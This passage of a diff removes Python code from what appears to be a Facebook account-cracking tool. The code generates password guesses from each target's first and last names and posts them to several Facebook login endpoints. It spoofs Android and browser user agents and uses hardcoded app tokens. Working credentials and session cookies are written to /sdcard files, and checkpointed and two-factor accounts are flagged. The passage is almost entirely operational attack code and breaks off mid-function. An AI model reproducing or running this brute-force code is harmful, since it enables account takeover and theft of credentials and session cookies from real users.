-					SK.submit(trt1,ids,passlist)
-				if mthd in ['2','02']:
-					SK.submit(trt2,ids,passlist)
-				if mthd in ['3','03']:
-					SK.submit(trt3,ids,passlist)
-				if mthd in ['4','04']:
-					SK.submit(trt4,ids,passlist)
-				if mthd in ['5','05']:
-					SK.submit(trt5,ids,passlist)
-				if mthd in ['6','06']:
-					SK.submit(trt6,ids,passlist)
-		print('\033[1;37m')
-		linex()
-		print(' The process has completed')
-		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-		linex()
-		input(' Press enter to back ')
-		os.system('python trt.py')
-#b-api method
-#1method
-def api1(ids,names,passlist):
-		try:
-			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [BILAL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-			fn = names.split(' ')[0]
-			try:
-				ln = names.split(' ')[1]
-			except:
-				ln = fn
-			for pw in passlist:
-				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-				
-				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-				application_version_code=str(random.randint(000000000,999999999))
-				__iam_genius = random.choice(android_models)
-				phone_model = __iam_genius.split('|')[0]
-				phone_company = __iam_genius.split('|')[1]
-				dimensions = __iam_genius.split('|')[2]
-				ffb=random.choice(fbks)
-				dvlk = random.choice(usr)
-				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
-				li = ['28','29','210']
-				li2 = random.choice(li)
-				j1 = ''.join(random.choice(digits) for _ in range(2))
-				j2 = li2+j1
-				device_family_id = str(uuid.uuid4())
-				adid = str(uuid.uuid4())
-				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
-				data = {'adid':adid,
-				'format':'json',
-				'device_id':device_family_id,
-				'email':ids,
-				'password':pas,
-				'generate_analytics_claim':'1',
-				'community_id':'','cpl':'true','try_num':'1',
-				'family_device_id':device_family_id,
-				'credentials_type':'device_based_login_password',
-				'generate_session_cookies':'1',
-				'error_detail_type':'button_with_disabled',
-				'source':'device_based_login',
-				'machine_id':machine_id,
-				'login_location_accuracy_m':'1.0',
-				'meta_inf_fbmeta':'',
-				'advertiser_id':adid,
-				'encrypted_msisdn':'',
-				'currently_logged_in_userid':'0',
-				'locale':'en_PK',
-				'client_country_code':'PK',
-				'method':'auth.login',
-				'fb_api_req_friendly_name':'authenticate',
-				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-				head = {
-				'content-type':'application/x-www-form-urlencoded',
-				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-type':'unknown',
-				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-				'user-agent':ua_string,
-				'x-fb-net-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-				'x-fb-connection-quality':'EXCELLENT',
-				'x-fb-friendly-name':'authenticate',
-				'accept-encoding':'gzip, deflate',
-				'x-fb-http-engine':	'Liger'}
-				url = 'https://b-api.facebook.com/method/auth.login'
-				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-				q = json.loads(po)
-				if 'session_key' in q:
-					print('\r\r\033[1;32m [SK-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
-					oks.append(ids)
-					break
-				elif 'www.facebook.com' in q['error_msg']:
-					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-						cps.append(ids)
-						break
-					else:
-						open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-						break
-				else:
-					continue
-			loop+=1
-		except requests.exceptions.ConnectionError:
-			time.sleep(10)
-		except Exception as e:
-			pass
-#m2
-#b-graph method		
-def api2(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BILAL-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        en = random.choice(['en_US','en_GB'])
-                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SK-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/BILAL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BILAL-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BILAL-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-  #method3             
-def api3(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BILAL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                "adid": adid,
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"email": ids,
-"password": pas,
-"generate_analytics_claims": "1",
-"credentials_type": "password",
-"source": "login",
-"error_detail_type": "button_with_disabled",
-"enroll_misauth": "false",
-"generate_session_cookies": "1",
-"generate_machine_id": "1",
-"fb_api_req_friendly_name": "authenticate",}
-                        headers={
-                                "Accept-Encoding": "gzip, deflate",
-"Accept": "*/*",
-"Connection": "keep-alive",
-"User-Agent": ua,
-"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"X-FB-Friendly-Name": "authenticate",
-"X-FB-Connection-Type": "unknown",
-"Content-Type": "application/x-www-form-urlencoded",
-"X-FB-HTTP-Engine": "Liger",
-"Content-Length": "329",}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BILAL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("Cookie: "+coki)
-                                        open('/sdcard/BILAL-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/BILAL-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BILAL-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-#b-api method
-#method3                
-def api4(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BILAL-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'meta_inf_fbmeta':'',
-                                'currently_logged_in_userid':'0',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-api.facebook.com/method/auth.login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BILAL-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BILAL-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error_msg']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                continue
-                loop+=1
-        except Exception as e:
-                pass
-#4method
-def api5(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BILAL-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        en = random.choice(['en_US','en_GB'])
-                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
-                        en = random.choice(['en_US','en_GB'])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                "adid": adid,
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"email": ids,
-"password": pas,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d",}
-                        headers={
-                                'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '25227',
-'X-FB-SIM-HNI': '29752',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': '706'}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SK-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/BILAL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BILAL-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BILAL-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/BILAL-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-def api6(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [BILAL-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SK=session.cookies.get_dict().keys()
-			if "c_user" in SK:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [BILAL-OK] %s | %s'%(ids,pas))
-				open('/sdcard/BILAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in SK:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BILAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method6
-#d.fb
-def api7(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [BILAL-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SK=session.cookies.get_dict().keys()
-			if "c_user" in SK:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [BILAL-OK] %s | %s'%(ids,pas))
-				open('/sdcard/BILAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in SK:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BILAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method7
-def api8(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [BILAL-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
